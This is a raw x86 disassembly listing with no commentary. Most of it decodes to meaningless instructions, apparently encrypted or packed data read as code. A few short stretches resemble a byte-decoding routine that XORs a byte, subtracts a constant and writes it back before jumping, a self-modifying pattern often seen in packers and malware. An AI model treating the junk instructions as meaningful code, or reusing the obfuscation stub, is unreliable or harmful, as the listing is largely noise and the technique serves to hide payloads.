  403893:	xor    eax,0x4eac120d
  403898:	add    eax,0xbfb06bbf
  40389d:	das    
  40389e:	mov    al,ds:0x4c068fed
  4038a3:	div    DWORD PTR [ebx+0x5f38a64a]
  4038a9:	inc    eax
  4038aa:	and    esp,DWORD PTR [ebx+edx*8+0x26081678]
  4038b1:	dec    esp
  4038b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038b3:	repnz fadd QWORD PTR [edi-0x706da97d]
  4038ba:	jbe    0x403884
  4038bc:	mov    es,WORD PTR ds:[edx-0xedb5f80]
  4038c3:	dec    esi
  4038c4:	and    BYTE PTR [eax+0x1ade13a2],dh
  4038ca:	data16 xor BYTE PTR [ebp-0x7c0de78f],cl
  4038d1:	retf   
  4038d2:	out    0xf9,al
  4038d4:	mov    BYTE PTR [edi],ch
  4038d6:	or     al,ah
  4038d8:	push   esp
  4038d9:	adc    edi,edx
  4038db:	(bad)  
  4038dc:	das    
  4038dd:	leave  
  4038de:	nop
  4038df:	add    eax,0x51fba4fa
  4038e4:	adc    esp,0x3ba15513
  4038ea:	jno    0x403882
  4038ec:	jae    0x4038e5
  4038ee:	mov    al,ds:0x6528b88f
  4038f3:	das    
  4038f4:	test   BYTE PTR [edx+0x7d],ch
  4038f7:	cmp    eax,0xe3f9dda1
  4038fc:	push   0xacf808fe
  403901:	mov    ebp,DWORD PTR [ecx]
  403903:	push   ebp
  403904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403905:	cmp    BYTE PTR [ebx+0x6d02e5d3],0xfb
  40390c:	mov    cl,0xf1
  40390e:	mov    eax,DWORD PTR ds:[ebx-0x5a]
  403912:	mov    bh,0x21
  403914:	push   esp
  403915:	pusha  
  403916:	adc    al,0xd3
  403918:	in     al,0x38
  40391a:	xchg   ebp,eax
  40391b:	adc    eax,0xcaaaccd2
  403920:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403921:	call   0x7948:0x2c98d763
  403928:	pop    edi
  403929:	rcr    BYTE PTR ds:0x5f1ef1c8,1
  40392f:	leave  
  403930:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403931:	jbe    0x40394e
  403933:	pushf  
  403934:	das    
  403935:	fwait
  403936:	mov    eax,ds:0xe42b8768
  40393b:	xchg   esp,eax
  40393c:	(bad)  
  40393d:	inc    edx
  40393e:	jmp    0x7af05d94
  403943:	lods   al,BYTE PTR ds:[esi]
  403944:	mov    ch,0x6d
  403946:	fild   DWORD PTR [ebx+0x1b492069]
  40394c:	popa   
  40394d:	inc    ebp
  40394e:	(bad)  
  40394f:	mov    ecx,ss
  403951:	imul   esi,DWORD PTR [ecx+ecx*1-0x58],0xffffff9d
  403956:	bound  eax,QWORD PTR [eax]
  403958:	in     al,dx
  403959:	sbb    edi,esp
  40395b:	inc    ecx
  40395c:	retf   0xba82
  40395f:	inc    esi
  403960:	outs   dx,DWORD PTR ds:[esi]
  403961:	das    
  403962:	(bad)  
  403963:	xor    edx,edi
  403965:	fld    TBYTE PTR [eax+0x4490f993]
  40396b:	out    0xa9,eax
  40396d:	stos   BYTE PTR es:[edi],al
  40396e:	jno    0x40396a
  403970:	mov    WORD PTR [ebx],cs
  403972:	dec    ecx
  403973:	add    al,BYTE PTR [ecx-0x63]
  403976:	sub    bl,cl
  403978:	aaa    
  403979:	popf   
  40397a:	imul   ebx,DWORD PTR [esi+edi*8+0x4aeecf17],0x33769e58
  403985:	fild   WORD PTR [ebp+0x16d3b4ac]
  40398b:	out    0xd8,al
  40398d:	fbld   TBYTE PTR [esp+ebp*2]
  403990:	out    0x6b,eax
  403992:	test   BYTE PTR [ecx],0x85
  403995:	ror    BYTE PTR [edi],0x84
  403998:	ss add al,0x0
  40399b:	add    BYTE PTR [ebp-0x977b],cl
  4039a1:	call   DWORD PTR [eax-0x75]
  4039a4:	inc    ebp
  4039a5:	in     al,0x33
  4039a7:	mov    BYTE PTR [ebx],0xc7
  4039aa:	push   eax
  4039ab:	mov    eax,DWORD PTR [ebp-0x18]
  4039ae:	add    eax,0xee
  4039b3:	push   eax
  4039b4:	mov    eax,DWORD PTR [ebp-0x18]
  4039b7:	mov    eax,DWORD PTR [eax+0x198]
  4039bd:	push   DWORD PTR [eax]
  4039bf:	jmp    0x403dcd
  4039c4:	push   es
  4039c5:	js     0x403a2e
  4039c7:	repnz popa 
  4039c9:	jno    0x40395e
  4039cb:	call   0xb3ee171
  4039d0:	cdq    
  4039d1:	int3   
  4039d2:	and    DWORD PTR [esi-0x9],ebx
  4039d5:	sbb    eax,0x7d6f7e7e
  4039da:	jle    0x403a5a
  4039dc:	rcl    DWORD PTR [ecx],0x8c
  4039df:	out    0x4e,al
  4039e1:	cld    
  4039e2:	scas   al,BYTE PTR es:[edi]
  4039e3:	jl     0x4039f4
  4039e5:	cmp    dl,ch
  4039e7:	ins    BYTE PTR es:[edi],dx
  4039e8:	mov    ch,bh
  4039ea:	push   ds
  4039eb:	xor    al,0x47
  4039ed:	fwait
  4039ee:	inc    eax
  4039ef:	xor    eax,DWORD PTR [ebx+0x46]
  4039f2:	inc    ecx
  4039f3:	mov    al,0xc0
  4039f5:	retf   0x62de
  4039f8:	dec    eax
  4039f9:	xchg   esp,eax
  4039fa:	aad    0x50
  4039fc:	rcl    DWORD PTR fs:[ecx],cl
  4039ff:	sbb    edx,DWORD PTR [edx-0x8]
  403a02:	jecxz  0x4039ca
  403a04:	stos   BYTE PTR es:[edi],al
  403a05:	jmp    0x892c:0xb1b901ee
  403a0c:	pop    es
  403a0d:	xor    ebx,DWORD PTR ds:0xab2f73b6
  403a13:	cmp    edi,ebx
  403a15:	xchg   esp,eax
  403a16:	adc    BYTE PTR [ecx-0x63224f4e],ah
  403a1c:	xor    ch,ah
  403a1e:	das    
  403a1f:	mov    bh,0x49
  403a21:	and    dh,BYTE PTR [esp+ecx*1-0x141fa5a]
  403a28:	leave  
  403a29:	xchg   dx,ax
  403a2b:	jecxz  0x403a69
  403a2d:	push   cs
  403a2e:	test   al,0x52
  403a30:	push   edx
  403a31:	div    BYTE PTR [ecx+0x4100ea83]
  403a37:	imul   esp,DWORD PTR [edi+0x3a],0xfffffff3
  403a3b:	loope  0x4039c7
  403a3d:	jne    0x403a7e
  403a3f:	arpl   WORD PTR [esi+0x28],sp
  403a42:	and    DWORD PTR [edx-0x11],ecx
  403a45:	xchg   dl,ah
  403a47:	adc    cl,BYTE PTR [edi]
  403a49:	inc    ebx
  403a4a:	in     al,0x5a
  403a4c:	cmp    esp,DWORD PTR [edx]
  403a4e:	xchg   edx,eax
  403a4f:	fldcw  WORD PTR [ebx]
  403a51:	dec    esp
  403a52:	je     0x403a18
  403a54:	mov    ch,0xb7
  403a56:	out    0x15,al
  403a58:	loopne 0x403a53
  403a5a:	mov    cs,ebp
  403a5c:	add    DWORD PTR [ebp+0x56b5a0d1],eax
  403a62:	cmp    eax,0xabdb3971
  403a67:	(bad)  
  403a68:	mov    eax,ds:0x3aac8a32
  403a6d:	push   esp
  403a6e:	push   es
  403a6f:	jo     0x403aa8
  403a71:	and    DWORD PTR [ebp+0x3d],eax
  403a74:	leave  
  403a75:	(bad)
  403a78:	je     0x403a83
  403a7a:	test   esi,eax
  403a7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a7d:	sbb    ah,BYTE PTR [esp+edi*2-0x43]
  403a81:	and    eax,0x1906db83
  403a86:	mov    edi,0x46cbf897
  403a8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a8c:	jo     0x403abc
  403a8e:	adc    al,0xfd
  403a90:	jp     0x403a17
  403a92:	ret    0x17a0
  403a95:	jae    0x403b12
  403a97:	pop    ecx
  403a98:	js     0x403ab0
  403a9a:	in     eax,dx
  403a9b:	mov    bl,dh
  403a9d:	and    al,BYTE PTR [esi]
  403a9f:	pushf  
  403aa0:	jle    0x403abb
  403aa2:	pop    ebx
  403aa3:	enter  0x47d1,0x62
  403aa7:	cmp    al,0xc
  403aa9:	push   esp
  403aaa:	jno    0x403aa6
  403aac:	lods   al,BYTE PTR ds:[esi]
  403aad:	sub    eax,0xae5f66aa
  403ab2:	jo     0x403a78
  403ab4:	jne    0x403abc
  403ab6:	push   eax
  403ab7:	mov    bl,al
  403ab9:	cmc    
  403aba:	or     al,0x71
  403abc:	jo     0x403a49
  403abe:	add    eax,0x492cc19b
  403ac3:	jne    0x403af2
  403ac5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ac6:	lea    esp,[ebp-0x4b]
  403ac9:	into   
  403aca:	jb     0x403a74
  403acc:	outs   dx,DWORD PTR ds:[esi]
  403acd:	out    0xcd,al
  403acf:	leave  
  403ad0:	cli    
  403ad1:	push   esp
  403ad2:	movsx  ecx,BYTE PTR [esi]
  403ad5:	fidivr WORD PTR [eax-0x1e]
  403ad8:	iret   
  403ad9:	pop    ds
  403ada:	mov    dh,0xa3
  403adc:	mov    ah,0x16
  403ade:	pop    esi
  403adf:	cmp    BYTE PTR [ebp+edx*4-0x21afc10d],ah
  403ae6:	xchg   edx,eax
  403ae7:	pop    edi
  403ae8:	ins    BYTE PTR es:[edi],dx
  403ae9:	jg     0x403b36
  403aeb:	scas   eax,DWORD PTR es:[edi]
  403aec:	xor    ebp,DWORD PTR [ecx]
  403aee:	mov    bl,0x89
  403af0:	mov    ebp,DWORD PTR [ecx]
  403af2:	cmp    al,dh
  403af4:	je     0x403afc
  403af6:	inc    ecx
  403af7:	inc    edi
  403af8:	xor    edi,eax
  403afa:	imul   ecx,DWORD PTR [eax-0x71],0xada80a8a
  403b01:	sub    ecx,ecx
  403b03:	sbb    BYTE PTR [ebp-0x3c6629d4],ah
  403b09:	into   
  403b0a:	bound  eax,QWORD PTR [edi-0x4b2dd428]
  403b10:	mov    edi,0xb73068ee
  403b15:	adc    eax,0x43591c5a
  403b1a:	mov    bh,dh
  403b1c:	jno    0x403b42
  403b1e:	daa    
  403b1f:	fwait
  403b20:	and    eax,0x2580b5d5
  403b25:	lods   eax,DWORD PTR ds:[esi]
  403b26:	mov    ecx,0xdda43082
  403b2b:	xchg   ebp,eax
  403b2c:	pop    ecx
  403b2d:	xor    dl,BYTE PTR [esp+esi*1-0x1590f1f0]
  403b34:	popa   
  403b35:	outs   dx,DWORD PTR ds:[esi]
  403b36:	out    0x30,eax
  403b38:	out    dx,al
  403b39:	mov    dh,0x9c
  403b3b:	jmp    0xb1f0:0xb6a80473
  403b42:	rcr    dh,cl
  403b44:	stc    
  403b45:	sub    dh,BYTE PTR [eax]
  403b47:	call   0xa823a3d
  403b4c:	inc    edi
  403b4d:	enter  0x4249,0x1a
  403b51:	or     DWORD PTR [ecx+0x43d3227a],edi
  403b57:	cmp    al,0xf6
  403b59:	dec    edi
  403b5a:	cmp    eax,esi
  403b5c:	ret    0xb41b
  403b5f:	xchg   edi,eax
  403b60:	mov    bh,0x2e
  403b62:	scas   al,BYTE PTR es:[edi]
  403b63:	sbb    al,0x70
  403b65:	jnp    0x403af4
  403b67:	retf   0x841d
  403b6a:	aam    0x35
  403b6c:	(bad)  
  403b6f:	mov    bl,0xf9
  403b71:	jle    0x403b1e
  403b73:	stos   DWORD PTR es:[edi],eax
  403b74:	jmp    0x4dc0:0x42a038c
  403b7b:	sub    BYTE PTR [edi+0x26],dh
  403b7e:	or     DWORD PTR [esi],edi
  403b80:	gs push ebp
  403b82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b83:	mov    ebx,0xeaaf96d1
  403b88:	xor    eax,0x4861acc8
  403b8d:	stos   BYTE PTR es:[edi],al
  403b8e:	xchg   ebp,eax
  403b8f:	xor    ch,BYTE PTR ds:[ebx+0x34ef8199]
  403b96:	out    dx,eax
  403b97:	out    dx,eax
  403b98:	rcr    BYTE PTR cs:[eax-0x27788550],cl
  403b9f:	push   ebp
  403ba0:	xor    cl,BYTE PTR [esp+ecx*2-0x372c7643]
  403ba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ba8:	mov    bh,0x5c
  403baa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bab:	dec    esi
  403bac:	sub    ebx,DWORD PTR cs:[eax]
  403baf:	in     eax,dx
  403bb0:	aaa    
  403bb1:	sub    al,0x4
  403bb3:	ins    BYTE PTR es:[edi],dx
  403bb4:	imul   BYTE PTR [edi]
  403bb6:	mov    edi,0xadbec426
  403bbb:	push   cs
  403bbc:	or     BYTE PTR [ebp+0x4a],bl
  403bbf:	cmp    eax,0xaeae8f7d
  403bc4:	dec    ebp
  403bc5:	push   0xffffff91
  403bc7:	std    
  403bc8:	dec    edi
  403bc9:	adc    ebx,esi
  403bcb:	push   ss
  403bcc:	lahf   
  403bcd:	jmp    0x4b38228a
  403bd2:	xchg   esi,eax
  403bd3:	sub    DWORD PTR [ebp+0xa376640],esp
  403bd9:	mov    WORD PTR [esi+0x75cf74d4],gs
  403bdf:	lds    edi,FWORD PTR [esp+edx*1+0x28]
  403be3:	mov    esp,0x4355360a
  403be8:	test   eax,0x58e87f33
  403bed:	adc    ebp,DWORD PTR [eax*2-0x11c18fee]
  403bf4:	in     al,0x8d
  403bf6:	ret    
  403bf7:	fstp   DWORD PTR [esi]
  403bf9:	test   BYTE PTR [ebx+0x2b],0x30
  403bfd:	in     eax,0x98
  403bff:	test   eax,0xce0eaf97
  403c04:	pxor   mm2,QWORD PTR [esi+0x2b]
  403c08:	test   al,0xb9
  403c0a:	daa    
  403c0b:	inc    eax
  403c0c:	pop    ss
  403c0d:	mov    dh,BYTE PTR [edx+0x8]
  403c10:	retf   0x1c4f
  403c13:	jnp    0x403c26
  403c15:	jo     0x403c91
  403c17:	jp     0x403c11
  403c19:	jg     0x403bbb
  403c1b:	mov    edi,0x3227afac
  403c20:	daa    
  403c21:	mov    ah,0x7c
  403c23:	jae    0x403c83
  403c25:	test   ah,ch
  403c27:	hlt    
  403c28:	fstp   TBYTE PTR [ebp+0x47]
  403c2b:	push   0xffffffc3
  403c2d:	cld    
  403c2e:	jg     0x403c2f
  403c30:	into   
  403c31:	sti    
  403c32:	mov    edx,0xdd3657d2
  403c37:	mov    al,ds:0xcb3651cb
  403c3c:	mov    ds:0xfdee05a7,al
  403c41:	clc    
  403c42:	push   ebp
  403c43:	lods   al,BYTE PTR ds:[esi]
  403c44:	mov    ebx,0xe64e49d8
  403c49:	es mov ebx,0xa8bf0943
  403c4f:	inc    ebx
  403c50:	ins    DWORD PTR es:[edi],dx
  403c51:	fs cdq 
  403c53:	fs cmp al,0x33
  403c56:	into   
  403c57:	loopne 0x403ca8
  403c59:	mov    esp,0xff77df2
  403c5e:	sbb    eax,0x5f
  403c61:	ds mov ah,0x50
  403c64:	ss mov esi,0x1151c3f7
  403c6a:	adc    edi,esi
  403c6c:	lods   eax,DWORD PTR ds:[esi]
  403c6e:	cmp    al,0x2c
  403c70:	not    DWORD PTR [ebp-0x4bb7ab0]
  403c76:	mov    dh,0x1e
  403c78:	add    DWORD PTR [edi+ebp*8],esi
  403c7b:	cmp    al,0x84
  403c7d:	or     ecx,esp
  403c7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c80:	addr16 or ebx,ebp
  403c83:	scas   eax,DWORD PTR es:[edi]
  403c84:	out    0xe9,eax
  403c86:	and    ebp,DWORD PTR [esi]
  403c88:	mov    bl,0x30
  403c8a:	test   BYTE PTR [ecx-0x72],ch
  403c8d:	retf   0x62ca
  403c90:	ss dec edi
  403c92:	inc    ebx
  403c93:	(bad)  
  403c94:	mov    ebx,0xf9dfc130
  403c99:	mov    al,ds:0x8d012652
  403c9e:	or     ecx,DWORD PTR [edi]
  403ca0:	(bad)  
  403ca2:	mov    cl,0x6
  403ca4:	xchg   ebp,eax
  403ca5:	inc    edi
  403ca6:	loop   0x403cbb
  403ca8:	inc    ecx
  403ca9:	div    al
  403cab:	ror    DWORD PTR [edx+edx*8],1
  403cae:	repnz ins BYTE PTR es:[edi],dx
  403cb0:	(bad)  
  403cb1:	leave  
  403cb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cb3:	inc    ebp
  403cb4:	shl    ebx,1
  403cb6:	dec    esi
  403cb7:	sub    DWORD PTR [ebx-0x39],ebp
  403cba:	inc    edx
  403cbb:	push   ss
  403cbc:	out    dx,eax
  403cbd:	adc    eax,0xbecf5425
  403cc2:	sub    ecx,ebp
  403cc4:	neg    DWORD PTR [ecx+0x7f]
  403cc7:	pop    edi
  403cc8:	int    0x33
  403cca:	enter  0x2f16,0xbe
  403cce:	std    
  403ccf:	or     ch,dl
  403cd1:	fsubrp st(1),st
  403cd3:	retf   0xbf7b
  403cd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cd7:	jmp    0x403d40
  403cd9:	and    eax,0x2a9ecfe6
  403cde:	jns    0x403ccf
  403ce0:	pop    esi
  403ce1:	test   al,0x94
  403ce3:	xchg   ebx,eax
  403ce4:	scas   eax,DWORD PTR es:[edi]
  403ce5:	retf   0x28be
  403ce8:	fidiv  WORD PTR [ecx-0x71ff4a49]
  403cee:	mov    gs,WORD PTR [ecx+edx*4-0x7d]
  403cf2:	loop   0x403d2c
  403cf4:	ins    BYTE PTR es:[edi],dx
  403cf5:	into   
  403cf6:	or     dh,ch
  403cf8:	add    edi,DWORD PTR [edi-0x40f5b1a3]
  403cfe:	sub    BYTE PTR [edx+ecx*8+0x656df1aa],bl
  403d05:	dec    edx
  403d06:	and    BYTE PTR [edx-0x60],ch
  403d09:	(bad)  
  403d0b:	js     0x403c95
  403d0d:	test   DWORD PTR [edx+0x6f4c0ffc],ebp
  403d13:	xor    al,0xb
  403d15:	jl     0x403d1d
  403d17:	mov    bh,0x8
  403d19:	fs jle 0x403cfb
  403d1c:	xchg   esi,eax
  403d1d:	popa   
  403d1e:	jp     0x403cad
  403d20:	(bad)  
  403d21:	push   eax
  403d22:	and    BYTE PTR [ebx+0x2],ch
  403d25:	cmp    ebx,0xba1bb49d
  403d2b:	push   ecx
  403d2c:	adc    eax,0x9ee25d13
  403d31:	add    eax,0xef43a087
  403d36:	ss push cs
  403d38:	fldcw  WORD PTR [esi]
  403d3a:	dec    ecx
  403d3b:	adc    DWORD PTR [ebx],edi
  403d3d:	(bad)  
  403d3e:	test   eax,0xe81466c
  403d43:	repnz push 0x468dac44
  403d49:	fcmovne st,st(6)
  403d4b:	mov    bx,0xb015
  403d4f:	clc    
  403d50:	inc    eax
  403d51:	fidiv  DWORD PTR [edx+0x60]
  403d54:	enter  0x690b,0x24
  403d58:	bound  ebx,QWORD PTR [eax]
  403d5a:	xchg   edx,edi
  403d5c:	mov    bl,0xfa
  403d5e:	and    DWORD PTR [edx+0x1ad921f5],esp
  403d64:	mov    edx,fs
  403d66:	test   DWORD PTR [ebp-0x2],0xe5e3cc29
  403d6d:	cdq    
  403d6e:	sahf   
  403d6f:	adc    BYTE PTR [edi+edx*4],bl
  403d72:	cmp    DWORD PTR [ebp-0xcf6dfd7],0x60464e98
  403d7c:	int3   
  403d7d:	out    0x21,al
  403d7f:	add    edi,DWORD PTR [edx+esi*1]
  403d82:	xor    al,0x39
  403d84:	push   ebp
  403d85:	dec    edi
  403d86:	push   cs
  403d87:	pop    eax
  403d88:	xchg   esi,eax
  403d89:	(bad)  
  403d8a:	jnp    0x403d16
  403d8c:	test   cl,bl
  403d8e:	pop    esp
  403d8f:	scas   eax,DWORD PTR es:[edi]
  403d90:	mov    esp,0xc4734fc5
  403d95:	scas   eax,DWORD PTR es:[edi]
  403d96:	mov    eax,0xfe70c09c
  403d9b:	retf   0x8a9f
  403d9e:	push   esp
  403d9f:	out    dx,al
  403da0:	stos   DWORD PTR es:[edi],eax
  403da1:	sub    DWORD PTR [edx+0x5f],esi
  403da4:	outs   dx,DWORD PTR ds:[esi]
  403da5:	add    DWORD PTR [ecx-0x3ee74d49],esi
  403dab:	xchg   esi,eax
  403dac:	lods   al,BYTE PTR ds:[esi]
  403dad:	scas   eax,DWORD PTR es:[edi]
  403dae:	call   0x69476634
  403db3:	inc    esp
  403db4:	mul    al
  403db6:	nop
  403db7:	fisubr DWORD PTR [ebp+0x76019b57]
  403dbd:	mov    bh,0x51
  403dbf:	cmp    al,0xca
  403dc1:	lahf   
  403dc2:	mov    al,ds:0x84da52fc
  403dc7:	(bad)  
  403dc8:	adc    ebx,DWORD PTR [ebp-0x7d]
  403dcb:	dec    ebp
  403dcc:	ss call 0x40c099
  403dd2:	mov    ecx,DWORD PTR [ebp-0x28]
  403dd5:	xor    ecx,esi
  403dd7:	mov    eax,0xffcd8d65
  403ddc:	sub    eax,ecx
  403dde:	sub    eax,DWORD PTR [ebp-0x4]
  403de1:	mov    ecx,DWORD PTR [ebp-0x48]
  403de4:	add    ecx,eax
  403de6:	mov    eax,DWORD PTR [ebp-0x4]
  403de9:	mov    DWORD PTR [eax+0x1],ecx
  403dec:	mov    al,BYTE PTR [ebp-0x11]
  403def:	mov    ecx,DWORD PTR [ebp-0x4]
  403df2:	xor    al,0x46
  403df4:	sub    al,0x38
  403df6:	mov    BYTE PTR [ecx],al
  403df8:	lea    eax,[ebp-0x4]
  403dfb:	inc    BYTE PTR [eax]
  403dfd:	inc    eax
  403dfe:	push   eax
  403dff:	pop    ecx
  403e00:	dec    ecx
  403e01:	jmp    0x40420f
  403e06:	dec    esp
  403e07:	repz repz adc esi,DWORD PTR [ecx+0x13]
  403e0c:	ins    BYTE PTR es:[edi],dx
  403e0d:	jno    0x403e09
  403e0f:	in     eax,0x73
  403e11:	sbb    DWORD PTR ds:0xe4537b5a,ecx
  403e17:	sbb    DWORD PTR [esi+0x7e],edi
  403e1a:	outs   dx,DWORD PTR ds:[esi]
  403e1b:	jge    0x403e9b
  403e1d:	jle    0x403e44
  403e1f:	rcl    BYTE PTR [edx-0x2c6cddd7],0x27
  403e26:	ret    
  403e27:	(bad)  
  403e28:	pop    ss
  403e29:	xchg   esp,eax
  403e2a:	shl    ah,0x72
  403e2d:	fisubr WORD PTR [esi+0x1f]
  403e30:	and    eax,edx
  403e32:	ficom  DWORD PTR [ebx-0x5d]
  403e35:	stos   DWORD PTR es:[edi],eax
  403e36:	xor    eax,esi
  403e38:	sar    DWORD PTR [ebp+0x39],1
  403e3b:	in     eax,dx
  403e3c:	jae    0x403ddf
  403e3e:	mov    al,ds:0x656c277c
  403e43:	xor    BYTE PTR [edi+0x3e],ah
  403e46:	jns    0x403e44
  403e48:	or     al,0x96
  403e4a:	cmp    ch,0x40
  403e4d:	xchg   ebx,eax
  403e4e:	jo     0x403de6
  403e50:	jae    0x403e71
  403e52:	in     al,0x2e
  403e54:	lods   al,BYTE PTR ds:[esi]
  403e55:	daa    
  403e56:	cmp    BYTE PTR [edi+ebx*4-0x40],0xfd
  403e5b:	pop    es
  403e5c:	hlt    
  403e5d:	jmp    0x2add85b1
  403e62:	xchg   ebx,eax
  403e63:	std    
  403e64:	and    ebx,DWORD PTR ds:0xbdc3868
  403e6a:	xchg   edi,eax
  403e6b:	stos   BYTE PTR es:[edi],al
  403e6c:	loop   0x403e7a
  403e6e:	and    eax,0xd5401993
  403e73:	push   edi
  403e74:	add    esp,DWORD PTR [esp+ecx*2]
  403e77:	xchg   edi,eax
  403e78:	xchg   ecx,eax
  403e79:	aad    0x22
  403e7b:	stos   DWORD PTR es:[edi],eax
  403e7c:	xor    ah,BYTE PTR [ebp-0x5ffa1a35]
  403e82:	das    
  403e83:	imul   esi,DWORD PTR [edx],0x52d29f9e
  403e89:	in     eax,0xe1
  403e8b:	jo     0x403e64
  403e8d:	je     0x403ecc
  403e8f:	lahf   
  403e90:	dec    ebx
  403e91:	loopne 0x403e81
  403e93:	adc    ch,0x83
  403e96:	hlt    
  403e97:	adc    eax,0x3d8de0a8
  403e9c:	xor    dl,BYTE PTR [edx]
  403e9e:	aad    0xe4
  403ea0:	mov    ebx,0xf09f9b2f
  403ea5:	test   BYTE PTR [esi+0x63],ah
  403ea8:	fnstcw WORD PTR [eax+0x4c]
  403eab:	cmc    
  403eac:	fcomip st,st(0)
  403eae:	cmp    al,BYTE PTR [eax]
  403eb0:	xor    BYTE PTR [ecx+0x4c],0x5
  403eb4:	ret    
  403eb5:	pop    ecx
  403eb6:	shl    BYTE PTR [esi+0x1b],cl
  403eb9:	inc    eax
  403eba:	je     0x403e64
  403ebc:	pop    ecx
  403ebd:	loop   0x403e8a
  403ebf:	jge    0x403eb6
  403ec1:	jl     0x403eb9
  403ec3:	les    edx,FWORD PTR [eax-0x7c1fb1d3]
  403ec9:	add    eax,0x242e4b4f
  403ece:	(bad)  
  403ecf:	aad    0x73
  403ed1:	fldcw  WORD PTR [ebx-0x45]
  403ed4:	stc    
  403ed5:	loope  0x403ea9
  403ed7:	jmp    0xb3320950
  403edc:	pusha  
  403edd:	jmp    0x403ebe
  403edf:	cli    
  403ee0:	lods   eax,DWORD PTR ds:[esi]
  403ee1:	cmp    eax,DWORD PTR [esi]
  403ee3:	sub    edi,DWORD PTR [ecx-0x6536d43d]
  403ee9:	inc    eax
  403eea:	and    BYTE PTR [eax],dh
  403eec:	lock adc eax,ecx
  403eef:	hlt    
  403ef0:	pop    ebp
  403ef1:	jmp    0xfe6b1eca
  403ef6:	inc    edi
  403ef7:	int3   
  403ef8:	or     al,0xae
  403efa:	and    ch,dh
  403efc:	bnd jg 0x403f4c
  403eff:	mov    dl,0x7f
  403f01:	pop    ss
  403f02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f03:	(bad)  
  403f05:	test   DWORD PTR [eax+ecx*8-0x68],edi
  403f09:	pop    ss
  403f0a:	cmp    DWORD PTR ds:0x95e822db,edi
  403f10:	xchg   DWORD PTR [eax+0x632c0179],esp
  403f16:	loopne 0x403f3b
  403f18:	pushw  0xffac
  403f1b:	pop    es
  403f1c:	mov    esi,0xf6d654f4
  403f21:	jo     0x403f98
  403f23:	cmp    esp,eax
  403f25:	test   cl,0xb0
  403f28:	sub    esp,DWORD PTR [eax+esi*8-0x67013b17]
  403f2f:	(bad)  [edx-0x70f79853]
  403f35:	xor    cl,BYTE PTR [edx+0x39]
  403f38:	mov    ecx,0xe1566ed
  403f3d:	mov    ss,WORD PTR [eax+eiz*1-0x2e]
  403f41:	adc    al,0xa4
  403f43:	(bad)  
  403f44:	je     0x403fb1
  403f46:	lods   al,BYTE PTR ds:[esi]
  403f47:	sub    esp,DWORD PTR [eax+0x75]
  403f4a:	(bad)  [eax-0x62b628cd]
  403f50:	push   ebp
  403f51:	(bad)  [eax]
  403f53:	fdiv   st(2),st
  403f55:	sub    edi,DWORD PTR [ecx]
  403f57:	stc    
  403f58:	ins    DWORD PTR es:[edi],dx
  403f59:	imul   esi,DWORD PTR [ebx-0x80],0xffffffa6
  403f5d:	dec    eax
  403f5e:	fsubr  st,st(7)
  403f60:	fs xchg edi,edi
  403f63:	mov    ds:0x404812f1,eax
  403f68:	adc    ecx,DWORD PTR [ebp-0x2b]
  403f6b:	xor    eax,0x47c29791
  403f70:	xchg   ebx,eax
  403f71:	outs   dx,BYTE PTR ds:[esi]
  403f72:	jmp    0x403fb2
  403f74:	ret    
  403f75:	ins    BYTE PTR es:[edi],dx
  403f76:	loop   0x403f5a
  403f78:	out    0xfa,al
  403f7a:	imul   esp,DWORD PTR [edi],0xcdc128b9
  403f80:	jnp    0x403f85
  403f82:	jns    0x403fef
  403f84:	xchg   edi,eax
  403f85:	retf   0xd2c
  403f88:	imul   eax,edi,0xc8795b9c
  403f8e:	outs   dx,DWORD PTR ds:[esi]
  403f8f:	inc    ebp
  403f90:	rcr    BYTE PTR [ecx],cl
  403f92:	push   eax
  403f93:	jnp    0x403f15
  403f95:	sub    eax,0x4926f34e
  403f9a:	lods   eax,DWORD PTR ds:[esi]
  403f9b:	ret    0x6332
  403f9e:	das    
  403f9f:	ins    DWORD PTR es:[edi],dx
  403fa0:	addr16 push ss
  403fa2:	jge    0x403f5b
  403fa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fa5:	fldcw  WORD PTR [ebp+0x67]
  403fa8:	clc    
  403fa9:	leave  
  403faa:	pop    ecx
  403fab:	jnp    0x403f31
  403fad:	cdq    
  403fae:	cdq    
  403faf:	add    ah,BYTE PTR [ebx]
  403fb1:	push   0xdcdeaca4
  403fb6:	adc    eax,0x77c5aa62
  403fbb:	rcl    DWORD PTR [ebp+0x54],0x3f
  403fbf:	sub    BYTE PTR [ebx-0x67879b55],ah
  403fc5:	pop    eax
  403fc6:	js     0x403f79
  403fc8:	inc    ebp
  403fc9:	push   eax
  403fca:	and    eax,0xb317747c
  403fcf:	stc    
  403fd0:	(bad)  
  403fd1:	cli    
  403fd2:	add    BYTE PTR [ebx+0x7c70531d],bh
  403fd8:	fwait
  403fd9:	jno    0x403fc1
  403fdb:	sub    al,0x2e
  403fdd:	sar    BYTE PTR [ebp-0x80],1
  403fe0:	lea    ecx,[eax-0x37]
  403fe3:	adc    dl,BYTE PTR [esi]
  403fe5:	test   dh,0x34
  403fe8:	push   esp
  403fe9:	fadd   DWORD PTR [ebp-0x1c]
  403fec:	(bad)  
  403fed:	pop    edi
  403fee:	stos   DWORD PTR es:[edi],eax
  403fef:	mov    ah,0x18
  403ff1:	dec    ecx
  403ff2:	jo     0x404007
  403ff4:	mov    dl,0xb7
  403ff6:	bnd je 0x403f80
  403ff9:	dec    edx
  403ffa:	retf   
  403ffb:	push   ss
  403ffc:	xor    BYTE PTR [ecx+eax*4-0x20d27d98],0xbf
  404004:	gs sub al,0xb4
  404007:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404008:	xchg   ecx,eax
  404009:	rcl    DWORD PTR [edi+0x1a],1
